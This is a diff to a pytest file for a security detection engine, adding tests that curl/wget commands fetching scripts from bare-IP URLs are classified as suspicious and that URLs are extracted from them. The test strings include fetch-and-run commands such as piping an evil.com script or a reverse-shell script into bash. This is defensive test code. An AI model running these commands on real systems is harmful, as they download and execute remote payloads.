@@ -1,5 +1,5 @@
 import pytest
-from app.detection.engine.correlation_engine import _is_event_a
+from app.detection.engine.correlation_engine import _is_event_a, _extract_url
 
 CMD_URL_SHELL = "http://evil.com/s.sh | bash"
 CMD_URL_ONLY = "http://evil.com/payload"
@@ -29,3 +29,39 @@ def test_curl_with_url_but_no_shell_indicator_matches():
 def test_non_download_tool_does_not_match():
     matched, _ = _is_event_a("python", f"python {CMD_URL_SHELL}")
     assert matched is False
+
+
+# ---------------------------------------------------------------------------
+# Bare IP URL tests (regression for schemaless curl attack pattern)
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("cmd,expected_url", [
+    ("curl 192.168.88.157:8080/backdoor.sh", "192.168.88.157:8080/backdoor.sh"),
+    ("wget 10.0.0.1/malware.sh", "10.0.0.1/malware.sh"),
+    ("curl 172.16.0.5:4444/rev.sh | bash", "172.16.0.5:4444/rev.sh"),
+])
+def test_curl_with_bare_ip_url_matches(cmd, expected_url):
+    """curl/wget with a bare IP:port/path URL (no http:// scheme) must be classified as Event A."""
+    tool = cmd.split()[0]
+    matched, url = _is_event_a(tool, cmd)
+    assert matched is True, f"Expected Event A for: {cmd}"
+    assert url == expected_url
+
+
+def test_curl_with_plain_ip_no_path_does_not_match():
+    """A bare IP address without a path component must NOT be classified as Event A."""
+    matched, _ = _is_event_a("curl", "curl 192.168.1.1")
+    assert matched is False
+
+
+def test_extract_url_bare_ip_port():
+    """_extract_url must extract bare IP:port/path tokens."""
+    url = _extract_url("curl 192.168.88.157:8080/backdoor.sh")
+    assert url == "192.168.88.157:8080/backdoor.sh"
+
+
+def test_extract_url_prefers_scheme_over_bare_ip():
+    """_extract_url must prefer http:// tokens over bare IPs when both are present."""
+    url = _extract_url("curl http://evil.com/s.sh 192.168.1.1/other")
+    assert url == "http://evil.com/s.sh"
